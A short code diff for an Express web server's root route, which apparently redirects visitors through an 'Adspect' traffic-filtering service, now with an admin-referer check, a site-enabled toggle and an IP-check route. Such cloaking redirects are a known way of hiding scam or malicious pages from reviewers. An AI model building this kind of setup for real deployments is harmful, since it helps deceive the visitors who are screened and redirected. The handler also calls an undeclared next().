@@ -458,18 +458,30 @@ const pageServingMiddleware = async (req, res, next) => {
 };
 
 app.get('/', (req, res) => {
-    console.log('Root route accessed - redirecting to Adspect');
-    
-    // Set a cookie to indicate we're doing the Adspect redirect
+    console.log('Root route accessed');
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+ 
+    if (isAdminPanel) {
+        return next(); 
+    }
+ 
+    // Check if website is enabled
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
+        return res.redirect(state.settings.redirectUrl);
+    }
+ 
+    // If enabled, set cookie and redirect to Adspect
+    console.log('- Redirecting to Adspect');
     res.cookie('adspect_redirect', 'true', {
         maxAge: 5000, // 5 seconds
         httpOnly: true,
         secure: true,
         sameSite: 'lax'
     });
-    
+        
     return res.redirect(302, 'https://redirectingroute.com/');
-});
+ });
 
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
